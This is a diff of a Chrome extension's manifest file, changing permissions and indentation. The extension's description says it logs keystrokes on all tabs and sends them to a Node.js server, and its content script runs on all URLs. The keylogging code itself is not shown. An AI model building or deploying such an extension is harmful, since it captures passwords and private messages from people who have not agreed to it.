@@ -4,16 +4,16 @@
     "description": "Logs the keystrokes on Chrome tabs and sends them to a server created using Node.js!",
     "version": "1.0",
     "permissions": [
-      "activeTab", "scripting", "tabs"
+        "storage", "activeTab", "tabs"
     ],
     "background": {
-      "service_worker": "background.js"
+        "service_worker": "background.js"
     },
     "content_scripts": [
-      {
+        {
         "matches": ["<all_urls>"],
         "js": ["content.js"]
-      }
+        }
     ]
-  }
+}
   
